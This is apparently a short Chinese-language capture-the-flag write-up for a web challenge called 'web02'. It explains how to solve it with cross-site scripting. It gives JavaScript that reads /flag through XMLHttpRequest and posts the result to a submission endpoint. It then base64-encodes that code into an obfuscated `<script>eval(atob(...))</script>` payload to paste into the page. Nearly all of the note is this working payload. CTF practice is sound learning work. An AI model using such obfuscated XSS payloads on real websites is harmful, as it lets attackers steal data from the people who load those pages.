# web02
	- xss
	- 写一段代码，从`/flag`下载flag并通过xhr发送到数据提交界面
		- ```js
		  function send(s) {
		      var xhr = new XMLHttpRequest();
		      xhr.open('POST', '/content/2b0efb2590e5d7e1b9ee585c786dd6be', true);
		      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		      var formData = {
		          'content': "here: " + s,
		      };
		      var formDataStr = '';
		      for (var key in formData) {
		          formDataStr += key + '=' + encodeURIComponent(formData[key]) + '&';
		      }
		      formDataStr = formDataStr.slice(0, -1); // 去掉最后一个&符号
		      xhr.send(formDataStr);
		  }
		  
		  var xhr = new XMLHttpRequest();
		  
		  xhr.open("GET", "/flag", true);
		  xhr.onload = function () {
		      if (xhr.status >= 200 && xhr.status < 300) {
		          send(xhr.responseText);
		      } else {
		          send("请求失败，状态码：" + xhr.status);
		      }
		  };
		  
		  xhr.send();
		  ```
	- 然后塞进base64里写成xss payload
		- ```html
		  <script>eval(atob("ZnVuY3Rpb24gc2VuZChzKSB7CiAgICB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICB4aHIub3BlbignUE9TVCcsICcvY29udGVudC8yYjBlZmIyNTkwZTVkN2UxYjllZTU4NWM3ODZkZDZiZScsIHRydWUpOwogICAgeGhyLnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtVHlwZScsICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnKTsKICAgIHZhciBmb3JtRGF0YSA9IHsKICAgICAgICAnY29udGVudCc6ICJoZXJlOiAiICsgcywKICAgIH07CiAgICB2YXIgZm9ybURhdGFTdHIgPSAnJzsKICAgIGZvciAodmFyIGtleSBpbiBmb3JtRGF0YSkgewogICAgICAgIGZvcm1EYXRhU3RyICs9IGtleSArICc9JyArIGVuY29kZVVSSUNvbXBvbmVudChmb3JtRGF0YVtrZXldKSArICcmJzsKICAgIH0KICAgIGZvcm1EYXRhU3RyID0gZm9ybURhdGFTdHIuc2xpY2UoMCwgLTEpOyAvLyDljrvmjonmnIDlkI7kuIDkuKom56ym5Y+3CiAgICB4aHIuc2VuZChmb3JtRGF0YVN0cik7Cn0KCnZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKCnhoci5vcGVuKCJHRVQiLCAiL2ZsYWciLCB0cnVlKTsKeGhyLm9ubG9hZCA9IGZ1bmN0aW9uICgpIHsKICAgIGlmICh4aHIuc3RhdHVzID49IDIwMCAmJiB4aHIuc3RhdHVzIDwgMzAwKSB7CiAgICAgICAgc2VuZCh4aHIucmVzcG9uc2VUZXh0KTsKICAgIH0gZWxzZSB7CiAgICAgICAgc2VuZCgi6K+35rGC5aSx6LSl77yM54q25oCB56CB77yaIiArIHhoci5zdGF0dXMpOwogICAgfQp9OwoKeGhyLnNlbmQoKTsKCg==")) </script>
		  ```
	- 把上面这段html放上去点提交就行